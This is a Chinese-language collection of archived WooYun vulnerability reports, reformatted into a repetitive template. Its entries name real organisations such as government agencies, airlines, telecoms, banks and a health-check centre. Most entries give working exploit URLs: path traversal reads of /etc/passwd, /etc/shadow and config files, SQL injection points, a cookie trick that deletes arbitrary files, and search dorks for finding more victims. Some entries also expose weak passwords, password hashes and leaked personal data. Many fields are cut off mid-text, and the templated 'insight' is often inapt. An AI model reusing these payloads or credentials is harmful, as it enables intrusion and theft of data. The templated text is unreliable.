**厂商**: 中国气象局 | **年份**: 2013 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ....

**POC**: 注射点 http://www.ipcc.cma.gov.cn/background/index.php?lang=cn&NewsID=17/etc/passwd 文件at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashdhcpd:x:102:65534:DHCP server daemon:/var/lib/dhcp:/bin/falseftp:x:40:49:FTP account:/srv/ftp:/bin

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0100065] 某数字化校园管理系统任意文件下载漏洞
**厂商**: 上海鼎创信息科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 鼎创数字化校园管理系统任意文件下载漏洞，可直接下载配置文件，泄露数据库连接信息官网：http://www.goodo.com.cn/成功案例：http://www2.goodo-edu.com/Web/goodoweb/216005.htm百度搜索：inurl:/EduPlate/任意文件下载链接： /OpenFile/OpenFile2.aspx?Url=

**POC**: 测试案例：http://www.jflxx.fxedu.cn/【任意文件下载】http://www.jflxx.fxedu.cn/OpenFile/OpenFile2.aspx?Url=/Web.config其他案例：http://218.78.245.29/OpenFile/OpenFile2.aspx?Url=/Web.confighttp://www.psgqzh.pudong-edu.sh.cn/OpenFile/OpenFile2.aspx?Url=/Web.confighttp://www.mlzx.net/OpenFile/OpenFile2.aspx?Url=/Web.conf

**绕过**: 直接利用

**修复**: 权限控制
---

---
### [wooyun-2013-040484] 乐视网某服务器的CVE-2009-3733漏洞(root权限)
**厂商**: 乐视网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器IP：http://123.126.33.181这个网站打开的话只有一个测试页面:OK一、一个目录遍历Request：GET //../../../../../../../../etc/passwd HTTP/1.1Host: 123.126.33.181Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*Response：HTTP/1.1 200 OKDate: Sun, 20 Oct 2013 08:31:47 GMTConnection: keep-aliveConten

**POC**: var/log/messages：近期访问日志：Oct 20 16:49:42 cdn sshd[931]: Connection closed by 117.121.54.22Oct 20 16:50:56 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/ethtool eth0Oct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16

**绕过**: 直接利用

**修复**: 升级；改密码；
---

---
### [wooyun-2015-0124514] 苏宁某分站目录遍历漏洞导致敏感信息泄露
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、目录遍历地址：http://im.suning.com/updates/im.suning.com是苏宁易购内部通讯工具登陆下载网站，通过http://im.suning.com/updates/DEV/CPP/WINDOWS/1.4.5.1/此处，可下载一个配置好的压缩包，里面配置存在敏感信息2、危害：可泄露员工号为11070530的登陆密码（加密，未破解成功），IM配置信息等等。[LogInfo]uid=sn11070530key=4761861adf2c806b299fa2f661ebb990jid=sn11070530@sitopenfireserver01.cnsuning.comusername=sn11070530{"panactive":1,"custNum":"6012776275","custPwd":"294199c745d29fa51cfef8945b10a29

**POC**: 泄露的对应的配置信息

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2014-088417] 万维家电网某系统任意文件读取
**厂商**: 万维家电网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.ea3w.com/login.php?Lang=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 哦
---

---
### [wooyun-2016-0177407] 迅雷看看之广告播放防护策略ByPass
**厂商**: 迅雷 | **年份**: 2016 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://www.kankan.com/任找一视频播放，http://vod.kankan.com/v/85/85338.shtml抓包，找到加载的广告http://20160225.float.sandai.net/finalfiles/n1455701640467.flvhttp://float.sandai.net/finalfiles/n1454753296536.flv接下来修改hosts127.0.0.1 20160225.float.sandai.net127.0.0.1 float.sandai.net广告完美去除

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2015-0139680] 黑龙江通信建设信息网任意文件下载+源码泄露
**厂商**: 黑龙江通信建设信息网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 黑龙江通信建设信息网  **.**.**.**网站采用的laravel  + wordpress框架，wordpress用的比较多，laravel 第一次遇到。0x00  网站OA登录系统没有对爆破进行限制，可以爆破弱口令。成功爆破一个弱口令： lixin  123456成功登陆OA系统用户的权限不高，只能查看工程质量管理，但是也可查看很多项目敏感信息0x01 任意文件下载漏洞URL：**.**.**.**/attachment/download?name=routes.php&path=../../../app/后台有一处文件下载的下载点，但是没有对参数path做限制，可以遍历文件系统进行下载：wp-config.php文件：httpd.conf文件：laravel的URL配置文件routes.php：laravel的database配置文件database.php：只要能猜到文件的路径

**POC**: 如上

**绕过**: 直接利用

**修复**: 1. 修改弱口令2. 限制文件下载的路径
---

---
### [wooyun-2014-059808] 生命人寿保险某分站任意文件读取
**厂商**: 生命人寿保险公司 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 参数注入

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://insurancecard.sino-life.com:7001/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwd打印功能是通过传递路径参数实现的，由此可以将服务器绝对路径作为参数传递过去，从而导致读取服务器敏感信息。

**POC**: 读取/etc/passwd读取weblogic的配置文件

**绕过**: 直接利用

**修复**: 一：重新设计函数。二：或者过滤相关参数(不推荐)，绕过方法太多。
---

---
### [wooyun-2014-048505] 中国邮政集团某系统后台弱口令及任意文件下载
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台弱口令：http://211.156.193.135/LoginAction.do 用户名：05d08 密码123456 经尝试发现05d03、05d05、05d06、05d07、05d09、05d10，密码也均为123456任意文件下载：http://211.156.193.135/DownLoadAction.do1、后台弱口令访问http://211.156.193.135/LoginAction.do，发现含有验证码，就直接使用搜索引擎，然后发现了用户名和密码。然后就直接登陆了，发现含有出入库管理、结算处理、系统处理、信息交流随意点击其中一个。2、任意文件下载http://211.156.193.135/DownLoadAction.do?action=download&fname=../../../../../../../../../../etc/passwdroot:x:0

**POC**: 如上

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0116665] 美图秀秀某任意文件读取漏洞
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 美图秀秀某站任意文件包含漏洞这个洞公开了，但我发现并没有修复完整。利用file协议依旧可以进行任意文件读取：http://xiuxiu.web.meitu.com/plat/pic_proxy.php?url=file:///etc/passwd究其原因，我们读取这个文件源码看看：http://xiuxiu.web.meitu.com/plat/pic_proxy.php?url=file:///www/web/xiuxiu.web.meitu.com/plat/pic_proxy.php<?php$url=trim($_GET['url']);if(validateURL($url)){echo @file_get_contents($url);die();}else{echo 'error';die();}function validateURL($url) {$pat

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 继续过滤。
---

---
### [wooyun-2014-054158] 长阳土家族自治县政务服务中心任意文件下载
**厂商**: 长阳土家族自治县政务服务中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hbcy.gov.cn/application/bgxz/download.jsp?filename=F:/web_changyang/public_html//application/index.jsp奇了怪了 怎么变成 广州行政许可网 了，服了

**POC**: http://www.hbcy.gov.cn/application/bgxz/download.jsp?filename=F:/web_changyang/public_html//application/index.jsp奇了怪了 怎么变成 广州行政许可网 了，服了

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2014-057628] 游乐购目录遍历导致用户资料泄露（部分用户明文密码、会员详细地址、电话、详细订单等）
**厂商**: 游乐购 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历导致用户资料泄露（部分用户明文密码、会员详细地址、电话、详细订单等）backup声明：没做任何破坏,我下载的已经删了

**POC**: 为安全起见，截取部分数据图 冰山一角附送两枚漏洞1绝对路径2phpinfo

**绕过**: 直接利用

**修复**: 目录遍历 敏感信息泄漏
---

---
### [wooyun-2014-074667] 翼支付某分站任意文件读取（一）
**厂商**: 中国电信综合平台开发运营中心 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先找到一枚文件读取http://kf.bestpay.com.cn/zhij/imsystem/js/im-client.js随后猜测有以下文件http://kf.bestpay.com.cn/zhij/imsystem/js/ajax.jshttp://kf.bestpay.com.cn/zhij/imsystem/js/jquery.js

**POC**: 先找到一枚文件读取http://kf.bestpay.com.cn/zhij/imsystem/js/im-client.js随后猜测有以下文件http://kf.bestpay.com.cn/zhij/imsystem/js/ajax.jshttp://kf.bestpay.com.cn/zhij/imsystem/js/jquery.js

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-040332] 山东航空集团# 某分站敏感信息泄露
**厂商**: 山东航空集团 | **年份**: 2013 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 山东航空集团站点：http://agents.shandongair.com.cn/存在列目录及文件下载 导致用户名密码泄露上图：ok  危害不大。  改改吧

**POC**: null

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0110940] 西北最大体检中心某站任意文件下载（泄露超过百万客户敏感数据）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 1.普惠体检是整个西北最大的体检中心，西安绝大多数单位体检都安排在普惠，包括政府部门、国企、私企、外企等，客户数量十分庞大2.普惠体检如下网站存在任意文件遍历/下载漏洞http://www.ipuhui.cc:2010/3.普惠体检用户数据放在da目录下，也可以通过da.rar打包下载4.泄露的客户体检数据有1.53GB5.以012.CSV为例，第一个表就有接近42万客户体检数据，16个表加起来，肯定超过百万了6.泄露的敏感数据包括体检用户的姓名、身份证、电话号码、单位等敏感信息，如下是大名鼎鼎的IBM泄露的敏感数据：7.还有中兴、华为等公司员工体检数据8.时间有限，就不继续了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-088070] PHP某鸡肋open_basedir绕过
**厂商**: PHP | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 比较鸡肋的一个判断文件是否存在在php5.3.2添加了一个新函数，stream_resolve_include_path用法stream_resolve_include_path($filename)，如果文件存在则返回改文件的绝对路径。此办法只能用于目录遍历此处用sae做测试测试遍历目录代码<?php//这里只测试五位的文件名称$a='qwertyuiopasdfghjklzxcvbnm';$f='';for($i1=0;$i1<strlen($a);$i1++){for($i2=0;$i2<strlen($a);$i2++){for($i3=0;$i3<strlen($a);$i3++){for($i4=0;$i4<strlen($a);$i4++){for($i5=0;$i5<strlen($a);$i5++){$f=$a[$i1].$a[$i2].$a[$i3].$a[$i4].$

**POC**: 比较鸡肋的一个判断文件是否存在在php5.3.2添加了一个新函数，stream_resolve_include_path用法stream_resolve_include_path($filename)，如果文件存在则返回改文件的绝对路径。此办法只能用于目录遍历此处用sae做测试测试遍历目录代码<?php//这里只测试五位的文件名称$a='qwertyuiopasdfghjklzxcvbnm';$f='';for($i1=0;$i1<strlen($a);$i1++){for($i2=0;$i2<strlen($a);$i2++){for($i3=0;$i3<strlen($a);$i3++){

**绕过**: 直接利用

**修复**: 你猜
---

---
### [wooyun-2014-054450] 安徽省自学考试网数据库备份文件泄露
**厂商**: 安徽热线 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于该服务器存在目录遍历.并且在DATA文件夹下存在数据库备份文件，导致近8W条考试信息外露，这些信息都十分敏感。通过简单的目录扫描就可以轻松的获取这些信息。

**POC**: 目录遍历备份目录信息泄露因为涉及无辜大众的敏感信息，打点码还是必要的包括身份证，家庭住址，文化水平，手机电话，考试成绩等等很多敏感的信息！基本裸体了。。。

**绕过**: 直接利用

**修复**: 携程的事情闹得沸沸扬扬，希望手里掌握群众数据的公司们都能注重一些细节的东西，尽量避免这些事情发生。修复目录遍历，删除备份信息。
---

---
### [wooyun-2016-0213603] 安徽农金某系统存在任意文件下载漏洞
**厂商**: 安徽农金 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安徽农金即安徽省农村合作金融机构,包括农村商业银行,农村合作银行和农村信用合作联社其实也就是这些**.**.**.**:9080/recruit/**.**.**.**:9080/recruit/biz09/T090101.shtml?fileName=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=downLoad

**POC**: **.**.**.**:9080/recruit/biz09/T090101.shtml?fileName=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts&action=downLoad**.**.**.**:9080/recruit/biz09/T090101.shtml?fileName=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow&action=downLoad**.**.**.**:9080/recr

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2015-0139293] 神器而已证券系列之广发证券系列问题
**厂商**: 广发证券 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.注入http://www.ns.gf.com.cn:80/collect/web/PersonInfoAction.go?function=GetBranchPersonInfo&view=v_ryxx_jjxs&branchId=17042.任意文件读取权限比较大，可以读取到shadow以及/root/.bash_history3.Memcached配置不当导致未授权访问121.14.2.23:112114.目录遍历http://weibo.gf.com.cn/confighttp://121.14.2.38/libs

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤.加强权限认证
---

---
### [wooyun-2012-013368] 中国万网主机管理平台目录遍历问题
**厂商**: 万网 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关闭列目录功能
---

---
### [wooyun-2016-0173246] 维普资讯网某系统目录可读取文件下载后台空密码
**厂商**: cqvip.com | **年份**: 2016 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://159.226.100.28:81/目录可读取有些css源码下载文件后台空密码

**POC**: 地址：http://159.226.100.28:81/目录可读取有些css源码下载文件后台空密码

**绕过**: 直接利用

**修复**: 不要就删了。。。。。
---

---
### [wooyun-2015-0103227] 某通用型购物系统默认文件下载可进后台
**厂商**: 三顾购物系统 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某通用型购物系统默认文件下载可进后台。源码：三顾购物系统服装版免费版 v3.12http://down.chinaz.com/soft/34793.htm存在默认数据库可被下载利用，进入后台。数据库地址：/data/3gushop.mdb可谷歌搜搜：三顾购物 inurl:area.asp实例证明：http://pos.sy1788.com//data/3gushop.mdbhttp://www.nxfzc.com/data/3gushop.mdbhttp://www.007cr.com//data/3gushop.mdbhttp://www.meifas.com//data/3gushop.mdbhttp://cn781238.124110.168.bz//data/3gushop.mdbhttp://www.cnzisha.cn//data/3gushop.mdbhttp://www.y

**POC**: 数据库下载证明：（漏洞证明）：

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2013-031401] 傲游网任意文件读取漏洞+SVN文件泄露
**厂商**: 傲游 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重要的问题出现在权限的设置，可以通过post恶意数据读取敏感文件http://my.maxthon.cn/convention.htmlhttp://my.maxthon.cn/help.htmlhttp://my.maxthon.cn/login.htmlhttp://my.maxthon.cn/recover.htmlhttp://my.maxthon.cn/register.htmlhttp://my.maxthon.cn/registerMobile.html我们post这段上去ln=../../../../../../../../../../etc/passwd%00.jpg其他页面也都是同样的方法，着了就不多解释了说好的，买一送一.svn配置错误，敏感文件泄露/language/language/en_us/language/en_us/css/language/en_us/i

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置好权限，过滤用户提交敏感字符
---

---
### [wooyun-2015-0150943] 中国社会科学院研究生院 任意文件下载
**厂商**: 中国社会科学院研究生院 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/download/download.jsp?filepath=/cass/index.shtml&filename=index.shtml下载首页index.shtml**.**.**.**/download/download.jsp?filepath=/download/download.jsp&filename=download.jsp下载当前文件http://**.**.**.**/download/download.jsp?filepath=/web-inf/web.xml&filename=web.xml下载web.xml

**POC**: **.**.**.**/download/download.jsp?filepath=/cass/index.shtml&filename=index.shtml下载首页index.shtml**.**.**.**/download/download.jsp?filepath=/download/download.jsp&filename=download.jsp下载当前文件http://**.**.**.**/download/download.jsp?filepath=/web-inf/web.xml&filename=web.xml下载web.xml

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-023967] 中国东方航空网站目录遍历/源码泄露
**厂商**: 中国东方航空股份有限公司 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在浏览器中输入http://tra-b2g.ceair.com/WebUI/ 可以在web中看到web目录里面的文件，及网页源代码。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 做好限制策略，将网站源码包放到其他地方
---

---
### [wooyun-2015-0155329] 群英某云应用任意文件下载漏洞
**厂商**: qy.com.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://kq.qycn.com/personnel/leave/download/?filename=a.php&file=../ThinkPHP/thinkphp.phphttp://kq.qycn.com/personnel/leave/download/?filename=a.php&file=../ThinkPHP/ThinkPHP.php下载参数为文件相对路径 理论上可以下载任意文件

**POC**: 应用index.php下载的框架文件

**绕过**: 直接利用

**修复**: 验证下载文件路径至允许用户上传目录可读
---

---
### [wooyun-2015-0146390] 彩经网某处设计漏洞导致服务器敏感信息泄露
**厂商**: 彩经网 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在下面的页面http://**.**.**.**/gl/pl5/图中红框部分存在目录遍历漏洞截包，修改参数“cacheName”的值返回页面和返回的数据包如下

**POC**: mysql配置文件httpdconf文件nginxconf文件

**绕过**: 直接利用

**修复**: 参数过滤访问控制
---

---
### [wooyun-2014-088421] ABAB小游戏某系统任意文件读取
**厂商**: ABAB小游戏 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.abab.com/login.php?Lang=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关系复杂
---

---
### [wooyun-2015-0122867] 49you游戏官网后台系统的备份文件下载，泄露数据库连接密码
**厂商**: 49you.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cms.49you.com//cms.sql直接下载即可下面是3个管理员的密码加密算法应该是md5把，初步解密下，一个都解密都不了。。。。不想再搞了，点到为止发个图证明下，把敏感字样涂抹掉

**POC**: 见详细说明把

**绕过**: 直接利用

**修复**: 删掉这个文件即可，以后可别把这么敏感的文件放在根目录下了
---

---
### [wooyun-2016-0171835] ttnet.net某站配置不当任意文件读取
**厂商**: ttnet.net | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一直没搞懂这种文件读取的原理，不过还是扫到一枚。203.74.57.13 对应 vh.ttnet.netcurl "http://203.74.57.13/etc/passwd"root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spoo

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ~~~~
---

---
### [wooyun-2014-071367] 某软件厂商程序存在通用性任意文件下载漏洞（可还原整套程序）
**厂商**: cncert国家应急响应中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 深圳太极枚举url：http://www.cqspbxz.com/application/gzhd/bgxz/download.jsp?filename=WEB-INF/web.xmlhttp://www.cqspbxz.com/application/gzhd/bgxz/download.jsp?filename=web-inf/classes/http://www.flsp.cn/application/gzhd/bgxz/download.jsp?filename=WEB-INF/web.xmlhttp://www.ddkspdt.com/application/gzhd/bgxz/download.jsp?filename=WEB-INF/web.xmlhttp://61.186.175.242/application/gzhd/bgxz/download.jsp?filename

**POC**: 首先下载完web.xml后，看到81行<init-param><param-name>config</param-name><param-value><!-- 更新这里时，请对比更新  QueryConfig.xml不是struts的配制文件 -->/WEB-INF/config/common-config.xml,/WEB-INF/config/strust-config.xml,/WEB-INF/config/formflow-config.xml,/WEB-INF/config/system-manager.xml,/WEB-INF/config/business-config.xml,

**绕过**: 直接利用

**修复**: 目录限制
---

---
### [wooyun-2013-047118] php云人才系统任意文件删除漏洞
**厂商**: php云人才系统 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在 /model/model/index.class.phpdelfiledir  这个function就不详细看了 就传个路径过去 直接删除.利用很简单.看下$this->uid  的获取方式/model/class/common.php  22行.$this->uid=$_COOKIE['uid'];直接在cookie里面取.虽然自己写的有过滤器 但是利用的数据根本不在过滤的范围内.

**POC**: 利用方法:1.  先注册个会员 登陆 默认显示基本信息 问题也出在基本信息 然后在cookie里面的uid 后面加上 /../../../data/db.safety.php2. 随便填数据 然后点击保存 即可删除 db.safety.php.

**绕过**: 直接利用

**修复**: 加个判断吧.
---

---
### [wooyun-2015-090141] 某省移动信息平台任意文件读取
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：https://m.scmcc.com.cn直接上图：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0132551] 国家测绘地理信息局某服务配置不当可任意文件下载
**厂商**: 国家测绘地理信息局 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ftp可以匿名登录，下载文件，包括某数据库文件、网站备份（不确定是哪些）、中国各种地图、视频(可能是公开视频)国家测绘地理信息局网址：**.**.**.**   IP：**.**.**.**FTP服务器IP：**.**.**.**  端口：21   匿名登录（ftp ftp)可以看到这是相关网站，从FTP上下载的文件也可以说明这一点。发现FTP是由于下载的某个东西是通过FTP连接下载的，具体是哪个连接已经忘了。。。

**POC**: 服务器连接数据库文件、网站备份各种地图

**绕过**: 直接利用

**修复**: 可惜不能上传
---

---
### [wooyun-2011-02324] 成都市人民政府网站TongWeb Application Server配置不当存在目录遍历漏洞
**厂商**: 成都市人民政府网站 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

